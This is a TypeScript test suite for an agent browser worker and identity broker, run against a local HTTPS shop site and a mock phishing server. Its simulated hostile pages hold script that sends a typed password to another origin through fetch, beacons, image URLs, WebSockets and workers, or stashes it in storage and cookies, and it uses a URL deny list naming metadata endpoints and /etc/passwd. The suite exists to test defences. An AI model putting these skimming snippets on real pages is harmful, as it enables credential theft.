/**
 * Schema v37 — the general browser / account operator with credential execution (PostgreSQL + the identity broker + a
 * REAL headless Chrome against a local HTTPS test site; no real website, account or identity).
 *
 * An agent signs up on a site no adapter knows: its username and email are filled by the broker, a strong password is
 * generated and stored in the vault, the verification email is opened from the withheld message, it logs in and captures
 * the API key the dashboard shows into its vault — and none of those secrets ever appears in anything the agent receives.
 * A page on another origin cannot get the password filled (origin pinning); a CAPTCHA is a human-only step for that
 * account; sessions are per agent; private addresses are unreachable.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import crypto from "crypto";
import { sealAccountLogin } from "../../fleet/identity/vaults.js";
import { execFileSync } from "child_process";
import fs from "fs";
import https from "https";
import os from "os";
import path from "path";
import pg from "pg";
import { findPgBin } from "./fixtures/ephemeral-pg.js";
import { startEconomyRegistry, OWNER, type EconomyRegistry, type Founder, econNext } from "./fixtures/economy-registry.js";
import { PgIdentityGateway } from "../../fleet/identity/gateway.js";
import { IdentityBroker } from "../../fleet/identity/broker.js";
import { SimulatedMailProvider } from "../../fleet/identity/providers.js";
import { initIdentityState, openIdentityState } from "../../fleet/identity/main.js";
import { PgBrowserGateway } from "../../fleet/browser/gateway.js";
import { BrowserWorker, secretForms } from "../../fleet/browser/worker.js";
import { browserEnvProblems } from "../../fleet/browser/main.js";
import { browserUrlAllowed, HostResolutionPolicy, addressPrivate } from "../../fleet/browser/policy.js";
import { totp } from "../../fleet/identity/crypto.js";
import { auditPrivileges } from "../../fleet/postgres/privileges.js";

const PG_BIN = findPgBin();
// R41.1: FLEET_TEST_CHROME runs the suite against a specific build (e.g. the pinned Chrome-for-Testing headless shell the
// production worker uses: scripts/fleet-browser-setup.sh).
const CHROME = [process.env.FLEET_TEST_CHROME ?? "", "/usr/bin/google-chrome", "/usr/bin/chromium", "/usr/bin/chromium-browser"].find((p) => p && fs.existsSync(p)) ?? null;
const OPENSSL = fs.existsSync("/usr/bin/openssl");

describe("browser URL policy and worker startup (unit)", () => {
  it("public sites only; never the host, private networks or metadata", () => {
    for (const ok of ["https://example.com/signup", "http://shop.example.org/", "about:blank"]) expect(browserUrlAllowed(ok), ok).toBe(true);
    for (const bad of ["http://127.0.0.1:8787/", "http://localhost/", "http://10.0.0.5/", "http://169.254.169.254/latest/meta-data", "http://192.168.1.1/",
      "http://[::1]/", "http://[fd00::1]/", "file:///etc/passwd", "ftp://example.com/", "https://user:pw@example.com/", "http://metadata.google.internal/"]) {
      expect(browserUrlAllowed(bad), bad).toBe(false);
    }
    expect(browserUrlAllowed("https://127.0.0.1:9443/", { allowLoopback: true })).toBe(true);
  });
  it("v79: a name that resolves to a loopback or private address is refused; the result is cached briefly", async () => {
    const dns: Record<string, string[]> = { "shop.example.com": ["93.184.216.34"], "rebind.example.com": ["127.0.0.1"], "mixed.example.com": ["93.184.216.34", "10.0.0.7"],
      "v6loop.example.com": ["::1"], "mapped.example.com": ["::ffff:127.0.0.1"], "cgnat.example.com": ["100.64.1.1"] };
    let lookups = 0;
    let now = 0;
    const p = new HostResolutionPolicy(async (h) => { lookups++; if (!dns[h]) throw new Error("ENOTFOUND"); return dns[h]; }, () => now);
    expect(await p.allowed("https://shop.example.com/listing")).toBe(true);
    for (const bad of ["https://rebind.example.com/", "https://mixed.example.com/", "https://v6loop.example.com/", "https://mapped.example.com/", "https://cgnat.example.com/",
      "https://nowhere.example.com/", "http://127.0.0.1:8787/"]) expect(await p.allowed(bad), bad).toBe(false);
    const n = lookups;
    expect(await p.allowed("https://shop.example.com/other")).toBe(true);
    expect(lookups).toBe(n); // cached
    now += 31_000;
    await p.allowed("https://shop.example.com/");
    expect(lookups).toBe(n + 1);
    expect(await p.allowed("data:text/html,x")).toBe(true);
    expect(await p.allowed("https://127.0.0.1:9443/", { allowLoopback: true })).toBe(true);
    for (const ip of ["127.0.0.1", "::1", "10.1.2.3", "169.254.169.254", "fd00::1", "::ffff:10.0.0.1"]) expect(addressPrivate(ip), ip).toBe(true);
    for (const ip of ["93.184.216.34", "2606:2800:220:1:248:1893:25c8:1946"]) expect(addressPrivate(ip), ip).toBe(false);
  });
  it("the worker refuses root, foreign credentials and a missing browser", () => {
    const base = { FLEET_BROWSER_DATABASE_URL: "postgresql://fleet_browser_login:x@127.0.0.1/db", FLEET_BROWSER_EXECUTABLE: process.execPath };
    expect(browserEnvProblems(base, { uid: 1000, username: "u" })).toEqual([]);
    expect(browserEnvProblems(base, { uid: 0, username: "root" })).toContain("refusing to run as root (uid 0)");
    for (const k of ["FLEET_ADMIN_DATABASE_URL", "FLEET_IDENTITY_DATABASE_URL", "FLEET_CUSTODY_DATABASE_URL", "ANTHROPIC_API_KEY"]) {
      expect(browserEnvProblems({ ...base, [k]: "x" }, { uid: 1000, username: "u" }).join(), k).toMatch(new RegExp(k));
    }
    expect(browserEnvProblems({ ...base, FLEET_BROWSER_EXECUTABLE: "/nope" }, { uid: 1000, username: "u" }).join()).toMatch(/EXECUTABLE/);
  });
});

describe.skipIf(!PG_BIN || !CHROME || !OPENSSL)("v37 general browser operator with credential execution (PostgreSQL + Chrome)", { timeout: 120_000 }, () => {
  let R: EconomyRegistry;
  let A: Founder;
  let B: Founder;
  let dir: string;
  let igw: PgIdentityGateway;
  let bgw: PgBrowserGateway;
  let broker: IdentityBroker;
  let worker: BrowserWorker;
  let agentDb: pg.Pool;
  let site: https.Server;
  let phish: https.Server;
  let SITE = "";
  let PHISH = "";
  let loop: NodeJS.Timeout;
  const mail = new SimulatedMailProvider();
  const users = new Map<string, { email: string; password: string; verified: boolean; totpSeed?: string; totpOn?: boolean; loginCode?: string }>();
  const pending2fa = new Map<string, string>();
  /** v126: everything that reached the other origin. */
  const offsite: string[] = [];
  const tokens = new Map<string, string>();
  const API_KEY = `sk_live_${crypto.randomBytes(16).toString("hex")}`;
  const results: unknown[] = [];
  const ok = async (p: Promise<Record<string, any>>) => {
    const r = await p;
    expect(r.ok, JSON.stringify(r)).toBe(true);
    return r;
  };
  /** Enqueue a browser op as the agent and run the worker until its page result is back. */
  const browse = async (who: Founder, op: string, args: Record<string, unknown>) => {
    // v95: a new session's first different submission on a site names the latest operation there (from the refusal).
    const q = await econNext(R, who, op, args);
    if (!q.ok) return q;
    for (let i = 0; i < 200; i++) {
      await worker.tick(1);
      const r = await R.econ(who, "browser.result", { actionId: q.actionId });
      if (r.status === "done" || r.status === "failed") { results.push(r); return { ...r, sessionId: q.sessionId }; }
      await new Promise((res) => setTimeout(res, 100));
    }
    throw new Error("browser action did not finish");
  };
  const page = (title: string, body: string) => `<!doctype html><html><head><title>${title}</title></head><body>${body}</body></html>`;
  const form = (req: https.IncomingMessage): Promise<URLSearchParams> => new Promise((res) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => res(new URLSearchParams(d))); });

  beforeAll(async () => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "fleet-browser-"));
    fs.chmodSync(dir, 0o700);
    execFileSync("openssl", ["req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:P-256", "-nodes", "-keyout", path.join(dir, "key.pem"),
      "-out", path.join(dir, "cert.pem"), "-days", "1", "-subj", "/CN=127.0.0.1"], { stdio: "ignore" });
    const tls = { key: fs.readFileSync(path.join(dir, "key.pem")), cert: fs.readFileSync(path.join(dir, "cert.pem")) };
    site = https.createServer(tls, async (req, res) => {
      const u = new URL(req.url ?? "/", SITE);
      const send = (html: string, status = 200, headers: Record<string, string> = {}) => { res.writeHead(status, { "Content-Type": "text/html", ...headers }); res.end(html); };
      const who = /sid=([a-z0-9]+)/.exec(req.headers.cookie ?? "")?.[1];
      if (u.pathname === "/signup" && req.method === "GET") return send(page("Sign up", `<form method=post action=/signup><label for=username>Username</label><input id=username name=username>
        <label for=email>Email</label><input id=email name=email type=email><label for=password>Password</label><input id=password name=password type=password>
        <p>By signing up you accept the <a href="/terms">seller terms</a>.</p><button type=submit>Create account</button></form>`));
      if (u.pathname === "/signup" && req.method === "POST") {
        const f = await form(req);
        users.set(f.get("username")!, { email: f.get("email")!, password: f.get("password")!, verified: false });
        const t = crypto.randomBytes(8).toString("hex");
        tokens.set(t, f.get("username")!);
        mail.deliver({ to: f.get("email")!, from: "noreply@sim-shop.test", subject: "Verify your email", body: `Welcome! Confirm here: ${SITE}/verify?t=${t}` });
        return send(page("Check your email", "<p>Check your email to verify your account.</p>"));
      }
      if (u.pathname === "/verify") {
        const name = tokens.get(u.searchParams.get("t") ?? "");
        if (name) users.get(name)!.verified = true;
        return send(page("Verified", name ? "<p>Email verified. You can log in.</p>" : "<p>Invalid link</p>"));
      }
      if (u.pathname === "/login" && req.method === "GET") return send(page("Log in", `<form method=post action=/login><input id=user name=user placeholder=Username>
        <input id=pass name=pass type=password placeholder=Password><button>Log in</button></form>`));
      if (u.pathname === "/login" && req.method === "POST") {
        const f = await form(req);
        const x = users.get(f.get("user") ?? "");
        // v79: an account with an authenticator asks for its code after the password.
        if (x && x.verified && x.password === f.get("pass") && x.totpOn) {
          const t = crypto.randomBytes(8).toString("hex");
          pending2fa.set(t, f.get("user")!);
          return send("", 302, { Location: "/login/2fa", "Set-Cookie": `p2fa=${t}; Path=/; Secure; HttpOnly` });
        }
        if (x && x.verified && x.password === f.get("pass")) return send("", 302, { Location: "/dashboard", "Set-Cookie": `sid=${f.get("user")}; Secure; HttpOnly` });
        return send(page("Log in", "<p>Wrong credentials</p>"), 401);
      }
      if (u.pathname === "/login/2fa" && req.method === "GET") return send(page("Two-step verification", `<form method=post action=/login/2fa><label for=otp>Authenticator code</label><input id=otp name=otp><button>Verify</button></form>`));
      if (u.pathname === "/login/2fa" && req.method === "POST") {
        const f = await form(req);
        const name = pending2fa.get(/p2fa=([a-f0-9]+)/.exec(req.headers.cookie ?? "")?.[1] ?? "");
        const x = users.get(name ?? "");
        if (!x || !x.totpSeed || f.get("otp") !== totp(x.totpSeed)) return send(page("Two-step verification", "<p>Wrong code</p>"), 401);
        return send("", 302, { Location: "/dashboard", "Set-Cookie": `sid=${name}; Path=/; Secure; HttpOnly` });
      }
      if (u.pathname === "/security" && req.method === "GET") {
        const x = users.get(who ?? "");
        if (!x) return send("", 302, { Location: "/login" });
        x.totpSeed ??= "JBSWY3DPEHPK3PXP" + crypto.randomBytes(5).toString("hex").toUpperCase().replace(/[^A-Z2-7]/g, "Q").slice(0, 8);
        return send(page("Security", `<p>Set up your authenticator. Key: <code id=seed>${x.totpSeed}</code></p><form method=post action=/security/totp><input id=code name=code><button>Enable</button></form>`));
      }
      if (u.pathname === "/security/totp" && req.method === "POST") {
        const x = users.get(who ?? "");
        const f = await form(req);
        if (!x || !x.totpSeed || f.get("code") !== totp(x.totpSeed)) return send(page("Security", "<p>Code not accepted</p>"), 400);
        x.totpOn = true;
        return send(page("Security", "<p>Two-step verification enabled</p>"));
      }
      // v79: passwordless sign-in by an emailed one-time code.
      if (u.pathname === "/login/email" && req.method === "GET") return send(page("Sign in by email", `<form method=post action=/login/email><input id=em name=em type=email><button>Send code</button></form>`));
      if (u.pathname === "/login/email" && req.method === "POST") {
        const f = await form(req);
        const name = [...users.entries()].find(([, v]) => v.email === f.get("em"))?.[0];
        if (name) {
          users.get(name)!.loginCode = String(crypto.randomInt(100000, 999999));
          mail.deliver({ to: f.get("em")!, from: "noreply@sim-shop.test", subject: "Your sign-in code", body: `Your one-time sign-in code is ${users.get(name)!.loginCode}. It expires in 10 minutes.` });
        }
        return send(page("Enter your code", `<form method=post action=/login/email/verify><input type=hidden name=em value="${f.get("em")}"><input id=code name=code><button>Sign in</button></form>`));
      }
      if (u.pathname === "/login/email/verify" && req.method === "POST") {
        const f = await form(req);
        const name = [...users.entries()].find(([, v]) => v.email === f.get("em"))?.[0];
        if (!name || !users.get(name)!.loginCode || users.get(name)!.loginCode !== f.get("code")) return send(page("Enter your code", "<p>Wrong code</p>"), 401);
        users.get(name)!.loginCode = undefined;
        return send("", 302, { Location: "/dashboard", "Set-Cookie": `sid=${name}; Path=/; Secure; HttpOnly` });
      }
      if (u.pathname === "/dashboard") {
        if (!who || !users.get(who)) return send("", 302, { Location: "/login" });
        return send(page("Dashboard", `<h1>Shop dashboard</h1><p>Customer orders: 3 (Sam, 4 Example Road)</p><p>Your API key: <code id=key>${API_KEY}</code></p>`));
      }
      if (u.pathname === "/captcha") return send(page("Prove you are human", `<div class="g-recaptcha"></div><iframe src="about:blank#recaptcha"></iframe>`));
      // v79: a listing editor with a photo upload, an embedded description editor (iframe), a CSV export, a preview popup
      // and a delete confirmation; a change-password form.
      if (u.pathname === "/listing/edit") return send(page("Edit listing", `<form id=f><label for=photo>Photos</label><input id=photo type=file multiple accept="image/*">
        <p id=picked>none</p><iframe name=desc srcdoc="<textarea id=body></textarea><p id=echo></p><script>document.getElementById('body').addEventListener('input',e=>document.getElementById('echo').textContent='desc:'+e.target.value)</script>"></iframe>
        <a id=csv href="/listing/export.csv" download>Download CSV</a> <a id=pv href="/listing/preview" target=_blank>Preview</a>
        <button type=button id=del>Delete draft</button><p id=deleted>kept</p><label><input type=checkbox id=news checked> newsletter</label></form>
        <script>document.getElementById('photo').addEventListener('change',e=>{document.getElementById('picked').textContent=[...e.target.files].map(f=>f.name+':'+f.size+':'+f.type).join(',')});
        document.getElementById('del').addEventListener('click',()=>{document.getElementById('deleted').textContent=confirm('Delete this draft?')?'deleted':'kept'});</script>`));
      if (u.pathname === "/listing/export.csv") { res.writeHead(200, { "Content-Type": "text/csv", "Content-Disposition": 'attachment; filename="listings.csv"' }); res.end("id,title,price\n1,Cash-flow workbook,12.00\n"); return; }
      // v126: pages that try to get a filled login out. Script here stands in for a hostile or compromised page.
      const loginForm = (extra = "", action = "/atk/sink") => `<form id=f method=post action="${action}"><input id=pass name=pass type=password>${extra}<button id=go>Go</button></form>`;
      if (u.pathname === "/atk/sink") return send(page("Received", "<p>Received</p>"));
      if (u.pathname === "/atk/redirect307") { res.writeHead(307, { Location: `${PHISH}/redirected` }); return res.end(); }
      if (u.pathname === "/atk/redirect302") { res.writeHead(302, { Location: "/atk/sink" }); return res.end(); }
      if (u.pathname === "/atk/form-off") return send(page("Off", loginForm("", `${PHISH}/form`)));
      if (u.pathname === "/atk/chain") return send(page("Chain", loginForm("", "/atk/hop1")));
      if (u.pathname === "/atk/hop1") { res.writeHead(307, { Location: "/atk/redirect307" }); return res.end(); }
      if (u.pathname === "/atk/moved") { res.writeHead(302, { Location: "/login" }); return res.end(); }
      if (u.pathname === "/atk/search-first") return send(page("Search", `<form action=/s><input id=q name=q type=text placeholder=Search></form><form method=post action=/login><input id=user name=user placeholder=Username><input id=pass name=pass type=password><button>Log in</button></form>`));
      if (u.pathname === "/atk/get-form") return send(page("Get", `<form method=get action=/atk/sink><input id=user name=user><input id=pass name=pass type=password><button>Go</button></form>`));
      if (u.pathname === "/atk/stash") return send(page("Stash", `${loginForm()}<script>document.getElementById('pass').addEventListener('input', (e) => { localStorage.setItem('s', e.target.value); document.cookie = 's=' + encodeURIComponent(e.target.value); });</script>`));
      if (u.pathname === "/atk/open-redirect") { res.writeHead(302, { Location: `${PHISH}/open-redirect${u.search}` }); return res.end(); }
      if (u.pathname === "/atk/script2") return send(page("Script2", `${loginForm()}<script>document.getElementById('pass').addEventListener('input', (e) => { const v = encodeURIComponent(e.target.value);
        fetch('/atk/open-redirect?p=' + v).catch(() => {}); try { new Worker('data:,fetch(' + JSON.stringify(${JSON.stringify(PHISH)} + '/worker?p=') + '+' + JSON.stringify(v) + ')'); } catch {} try { new RTCPeerConnection(); document.title = 'webrtc'; } catch {} });</script>`));
      if (u.pathname === "/atk/promo") return send(page("After", `<form method=post action=/atk/sink><input id=promo name=promo_code></form>`));
      if (u.pathname === "/atk/to-promo") { res.writeHead(302, { Location: "/atk/promo" }); return res.end(); }
      if (u.pathname === "/atk/promo-login") return send(page("Login", loginForm("", "/atk/to-promo")));
      if (u.pathname === "/atk/echo-guess") return send(page(`Echo ${u.searchParams.get("q") ?? ""}`, "<p>echo</p>"));
      if (u.pathname === "/atk/bounce") { res.writeHead(302, { Location: `${PHISH}/internal-secret-page` }); return res.end(); }
      if (u.pathname === "/atk/labelled") return send(page("Labelled", `<form><label id=lb>New <span id=sp>password</span><input id=np type=password></label></form>`));
      if (u.pathname === "/atk/get-button") return send(page("GetBtn", `<form method=post action=/atk/sink><input id=pass name=pass type=password><button formmethod=get>Go</button></form>`));
      if (u.pathname === "/atk/promo-code") return send(page("After", `<form method=post action=/atk/sink><input id=code name=postcode placeholder="Promo code"></form>`));
      if (u.pathname === "/atk/to-promo-code") { res.writeHead(302, { Location: "/atk/promo-code" }); return res.end(); }
      if (u.pathname === "/atk/promo-code-login") return send(page("Login", loginForm("", "/atk/to-promo-code")));
      if (u.pathname === "/atk/dead") return send(page("Dead", `<a id=dead href="https://127.0.0.1:1/">dead</a>`));
      if (u.pathname === "/atk/formaction") return send(page("Formaction", loginForm(`<button id=off formaction="${PHISH}/formaction">Off</button>`)));
      if (u.pathname === "/atk/307") return send(page("307", loginForm("", "/atk/redirect307")));
      if (u.pathname === "/atk/302") return send(page("302", loginForm("", "/atk/redirect302")));
      if (u.pathname === "/atk/frame") return send(page("Frame", `<iframe id=fr src="${PHISH}/framed"></iframe>`));
      if (u.pathname === "/atk/script") return send(page("Script", `${loginForm()}<script>
        document.getElementById('pass').addEventListener('input', (e) => { const v = e.target.value; const o = ${JSON.stringify(PHISH)};
          fetch(o + '/fetch', { method: 'POST', mode: 'no-cors', body: v }).catch(() => {});
          navigator.sendBeacon(o + '/beacon', v);
          new Image().src = o + '/img?p=' + encodeURIComponent(v);
          new Image().src = o + '/img64?p=' + btoa(v);
          fetch(o + '/get?p=' + encodeURIComponent(v), { mode: 'no-cors' }).catch(() => {});
          try { new WebSocket(o.replace('https', 'wss') + '/ws?p=' + encodeURIComponent(v)); } catch {}
        });</script>`));
      if (u.pathname === "/atk/popup") return send(page("Popup", `${loginForm()}<button id=pop onclick="window.open('${PHISH}/popup')">Open</button>`));
      if (u.pathname === "/atk/echo") return send(page("Echo", `${loginForm(`<input id=reveal type=password role=button><label for=lab id=ll>L</label><input id=lab>`)}<a id=l href="/x">x</a><div id=d></div><script>
        document.getElementById('pass').addEventListener('input', (e) => { const v = e.target.value;
          document.title = 'T ' + v;
          document.getElementById('d').innerText = 'plain ' + v + ' pct ' + encodeURIComponent(v) + ' b64 ' + btoa(v) + ' json ' + JSON.stringify(v);
          document.getElementById('l').href = '/x/' + encodeURIComponent(v) + '?b=' + btoa(v);
          document.getElementById('l').textContent = v;
          document.getElementById('ll').textContent = v;
          document.getElementById('lab').setAttribute('placeholder', v);
          const b = document.createElement('input'); b.type = 'submit'; b.value = v; b.name = v; document.body.appendChild(b);
          e.target.type = 'button';
          history.replaceState(null, '', '/atk/echo/' + encodeURIComponent(v));
          alert(v);
        });</script>`));
      if (u.pathname === "/atk/swap") return send(page("Swap", `<form method=post action=/atk/sink><input id=pass name=pass type=text></form>`));
      if (u.pathname === "/out") return send(page("Links", `<a id=away href="${PHISH}/">away</a>`));
      if (u.pathname === "/listing/preview") return send(page("Listing preview", "<h1>Cash-flow workbook</h1><p>Preview as buyers see it</p>"));
      // v79: a JavaScript-rendered profile wizard (content arrives after load; a hidden file input behind a drop zone; a
      // button enabled only after validation) and a social composer (contenteditable editor, image attach, character count).
      if (u.pathname === "/studio/profile") return send(page("Profile setup", `<div id=app>Loading…</div><script>
        setTimeout(()=>{document.getElementById('app').innerHTML='<h2>Step 1 of 2: your shop</h2><input id=shop placeholder="Shop name"><textarea id=about placeholder="About"></textarea>'
          +'<div id=drop style="border:2px dashed #999;padding:20px">Drop your logo here<input id=logo type=file accept="image/png" style="display:none"></div><p id=logo-ok></p>'
          +'<button id=next disabled>Continue</button><p id=saved></p>';
          const v=()=>{document.getElementById('next').disabled=!(document.getElementById('shop').value.length>2&&document.getElementById('logo').files.length)};
          document.getElementById('shop').addEventListener('input',v);
          document.getElementById('logo').addEventListener('change',e=>{document.getElementById('logo-ok').textContent='logo '+e.target.files[0].name;v()});
          document.getElementById('next').addEventListener('click',()=>{document.getElementById('app').innerHTML='<h2>Step 2 of 2: done</h2><p>Profile saved for '+document.getElementById('shop').value+'</p>'});
        },400);</script>`));
      if (u.pathname === "/social/compose") return send(page("New post", `<div id=editor contenteditable=true style="min-height:60px;border:1px solid #ccc"></div><p id=count>0/280</p>
        <input id=media type=file accept="image/*"><button id=post>Post</button><p id=posted></p><script>
        const ed=document.getElementById('editor');ed.addEventListener('input',()=>{document.getElementById('count').textContent=ed.innerText.length+'/280'});
        document.getElementById('post').addEventListener('click',()=>{const f=document.getElementById('media').files[0];
          document.getElementById('posted').innerHTML='Posted: <a href="/social/p/42">view post</a> with '+(f?f.name:'no image')+' - '+ed.innerText.slice(0,40)});</script>`));
      if (u.pathname === "/account/password" && req.method === "GET") return send(page("Change password", `<form method=post action=/account/password><input id=cur name=cur type=password>
        <input id=new1 name=new1 type=password><input id=new2 name=new2 type=password><button>Change</button></form>`));
      if (u.pathname === "/account/password" && req.method === "POST") {
        const f = await form(req);
        const x = users.get(who ?? "");
        if (!x || x.password !== f.get("cur") || !f.get("new1") || f.get("new1") !== f.get("new2")) return send(page("Change password", "<p>Password not changed</p>"), 400);
        x.password = f.get("new1")!;
        return send(page("Password changed", "<p>Password changed</p>"));
      }
      return send(page("Not found", "nothing"), 404);
    });
    phish = https.createServer(tls, (req, res) => {
      let body = ""; req.on("data", (c) => (body += c));
      req.on("end", () => {
        offsite.push(`${req.method} ${req.url} ${body}`);
        res.writeHead(200, { "Content-Type": "text/html", "Access-Control-Allow-Origin": "*" });
        res.end(page("Session expired", `<input id=password type=password><button>Continue</button>`));
      });
    });
    phish.on("upgrade", (req, sock) => { offsite.push(`WS ${req.url}`); sock.destroy(); });
    await new Promise<void>((r) => site.listen(0, "127.0.0.1", () => r()));
    await new Promise<void>((r) => phish.listen(0, "127.0.0.1", () => r()));
    SITE = `https://127.0.0.1:${(site.address() as { port: number }).port}`;
    PHISH = `https://127.0.0.1:${(phish.address() as { port: number }).port}`;

    R = await startEconomyRegistry(PG_BIN!, { founders: 2, allocationCents: 10_000 });
    [A, B] = R.founders;
    initIdentityState(path.join(dir, "identity"));
    fs.chmodSync(path.join(dir, "identity"), 0o700);
    igw = new PgIdentityGateway({ connectionString: R.pgc.identityUrl });
    const { vault, ownerVault } = openIdentityState(path.join(dir, "identity"));
    broker = new IdentityBroker(igw, vault, { mail, ownerVault, stateFile: path.join(dir, "identity", "pending.json") });
    await broker.registerProviders(); // v41: the broker registers its providers (none = NOT CONFIGURED)
    bgw = new PgBrowserGateway({ connectionString: R.pgc.browserUrl });
    worker = new BrowserWorker(bgw, { executablePath: CHROME!, allowLoopback: true, ignoreHttpsErrors: true, brokerPublicKey: async () => (await bgw.brokerKey()).ownerPub });
    agentDb = new pg.Pool({ connectionString: R.pgc.agentUrl, max: 1 });
    // The broker runs alongside (it serves credential requests while the worker waits).
    let busy = false;
    loop = setInterval(() => { if (!busy) { busy = true; void broker.tick().catch(() => {}).finally(() => { busy = false; }); } }, 150);
    await ok(R.econ(A, "mailbox.provision", { localPart: "maya", idempotencyKey: `id:${crypto.randomUUID()}` }));
    for (let i = 0; i < 40 && !(await R.q(`SELECT 1 FROM fleet.fleet_agent_mailboxes`)).length; i++) await new Promise((r) => setTimeout(r, 100));
  }, 240_000);
  afterAll(async () => {
    clearInterval(loop);
    await worker?.close(); await bgw?.close(); await igw?.close(); await agentDb?.end(); await R?.close();
    site?.close(); phish?.close();
    if (dir) fs.rmSync(dir, { recursive: true, force: true });
  });

  let accountId = "";
  let sessionId = "";

  it("signs up on an unknown site: username, email and a generated password filled by the broker; the email link opened from the withheld message", async () => {
    const box = (await R.q(`SELECT address FROM fleet.fleet_agent_mailboxes WHERE agent_id = $1`, [A.id]))[0].address;
    const reg = await ok(R.econ(A, "account.register", { platform: "sim-shop", kind: "storefront", handle: "mayahart", origin: SITE, loginEmail: box }));
    accountId = reg.accountId;
    const o = await browse(A, "browser.open", { url: `${SITE}/signup`, accountId });
    expect(o.status).toBe("done");
    sessionId = o.sessionId;
    expect(o.result.fields.map((f: any) => f.selector)).toEqual(expect.arrayContaining(["#username", "#email", "#password"]));
    expect(o.result.links.some((l: any) => l.text === "seller terms")).toBe(true);
    const s = await browse(A, "browser.act", { sessionId, steps: [
      { action: "fill", selector: "#username", credential: "username" }, { action: "fill", selector: "#email", credential: "email" },
      { action: "fill", selector: "#password", credential: "generate_password" }, { action: "click", text: "Create account" }] });
    expect(s.status, JSON.stringify(s.result)).toBe("done");
    expect(s.result.title).toBe("Check your email");
    const u = users.get("mayahart")!;
    expect(u.email).toBe(box);
    expect(u.password).toMatch(/^[A-Za-z0-9\-_.!#%+]{28}$/);
    // The password is the vault's credential for this account.
    const cred = (await R.q(`SELECT kind, status FROM fleet.fleet_agent_account_credentials WHERE account_id = $1`, [accountId]));
    expect(cred).toEqual([{ kind: "password", status: "active" }]);
    // The verification email is withheld from the agent; open_auth_link uses it.
    for (let i = 0; i < 30 && !(await R.q(`SELECT 1 FROM fleet.fleet_auth_message_blobs`)).length; i++) await new Promise((r) => setTimeout(r, 100));
    const inbox = (await ok(R.econ(A, "mail.inbox", {}))).messages;
    expect(inbox[0]).toMatchObject({ subject: "Verify your email", authenticationMessage: true });
    expect(JSON.stringify(inbox)).not.toMatch(/verify\?t=/);
    const v = await browse(A, "browser.act", { sessionId, steps: [{ action: "open_auth_link" }] });
    expect(v.status, JSON.stringify(v.result)).toBe("done");
    expect(v.result.text).toContain("Email verified");
    expect(v.result.url).toBe(`${SITE}/verify`); // no token in what the agent sees
    expect(u.verified).toBe(true);
  });

  it("logs in with vault credentials and captures the dashboard's API key into the vault; the agent sees the business data, never a secret", async () => {
    const r = await browse(A, "browser.act", { sessionId, steps: [
      { action: "goto", url: `${SITE}/login` }, { action: "fill", selector: "#user", credential: "username" }, { action: "fill", selector: "#pass", credential: "password" },
      { action: "click", text: "Log in" }, { action: "wait_for", selector: "#key" }, { action: "capture", selector: "#key", kind: "api_key" }] });
    expect(r.status, JSON.stringify(r.result)).toBe("done");
    expect(r.result.text).toContain("Customer orders: 3 (Sam, 4 Example Road)");
    expect(r.result.text).toContain("[credential]");
    const kinds = (await R.q(`SELECT kind FROM fleet.fleet_agent_account_credentials WHERE account_id = $1 AND status = 'active' ORDER BY kind`, [accountId])).map((x) => x.kind);
    expect(kinds).toEqual(["api_key", "password"]);
    await ok(R.econ(A, "account.mark", { accountId, status: "active", verification: "email_verified", note: "signed up and verified via browser" }));
    // Nothing the agent received — nor anything stored as text — contains a secret.
    const everything = JSON.stringify(results) + JSON.stringify(await R.q(`SELECT (SELECT jsonb_agg(result) FROM fleet.fleet_browser_actions) a,
      (SELECT jsonb_agg(steps) FROM fleet.fleet_browser_actions) s, (SELECT jsonb_agg(detail) FROM fleet.fleet_events) e, (SELECT jsonb_agg(m) FROM fleet.fleet_agent_mail m) m`));
    expect(everything).not.toContain(users.get("mayahart")!.password);
    expect(everything).not.toContain(API_KEY);
    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_browser_secret_requests WHERE sealed IS NOT NULL OR sealed_in IS NOT NULL`))[0].n).toBe(0);
  });

  it("origin pinning: another origin cannot get the password filled; a CAPTCHA is a human step for that account only", async () => {
    const p = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: PHISH }, { action: "fill", selector: "#password", credential: "password" }] });
    expect(p.status).toBe("failed");
    expect(p.result.code).toBe("FLEET_ORIGIN_NOT_PINNED");
    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_events WHERE event_type = 'browser_credential_refused'`))[0].n).toBe(1);
    const c = await browse(A, "browser.act", { sessionId, steps: [{ action: "goto", url: `${SITE}/captcha` }] });
    expect(c.result.captcha).toBe(true);
    await ok(R.econ(A, "account.mark", { accountId, status: "human_action_required", note: "reCAPTCHA on the payout settings page" }));
    expect((await R.q(`SELECT count(*)::int AS n FROM fleet.fleet_owner_requests WHERE kind = 'human_identity' AND status = 'pending'`))[0].n).toBe(1);
    expect(await ok(R.econ(A, "venture.list", {}))).toMatchObject({ ok: true }); // everything else continues
  });

  it("v79 hands: the agent's own files uploaded, an embedded editor, a dialog, a download, a popup tab, a screenshot and its own design rendered", async () => {
    const png = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8cfc0f01f0005000201a5f6b1c20000000049454e44ae426082", "hex");
    const logo = await ok(R.econ(A, "browser.stage_file", { fileName: "logo.png", contentType: "image/png", contentB64: png.toString("base64") }));
    const html = `<!doctype html><html><body style="margin:0"><div style="width:600px;height:300px;background:#123456;color:#fff;font:48px sans-serif">Ledgerline</div></body></html>`;
    const design = await ok(R.econ(A, "browser.stage_file", { fileName: "banner.html", contentType: "text/html", contentB64: Buffer.from(html).toString("base64") }));
    const o = await browse(A, "browser.open", { url: `${SITE}/listing/edit` });
    const sid = o.sessionId;
    const r = await browse(A, "browser.act", { sessionId: sid, steps: [
      { action: "upload_file", selector: "#photo", fileIds: [logo.fileId] },
      { action: "fill", selector: "#body", value: "Hand-made templates", frame: "iframe[name=desc]" },
      { action: "wait_for", selector: "#echo:has-text(\"desc:Hand-made templates\")", frame: "iframe[name=desc]" },
      { action: "dialog", accept: true }, { action: "click", selector: "#del" }, { action: "uncheck", selector: "#news" }, { action: "hover", text: "Preview" },
      { action: "scroll", to: "bottom" }, { action: "download", selector: "#csv" }] });
    expect(r.status, JSON.stringify(r.result)).toBe("done");
    expect(r.result.text).toContain(`logo.png:${png.length}:image/png`);
    expect(r.result.text).toContain("deleted");
    expect(r.result.lastDialog).toBe("confirm: Delete this draft?");
    const dl = r.result.files.find((f: any) => f.kind === "download");
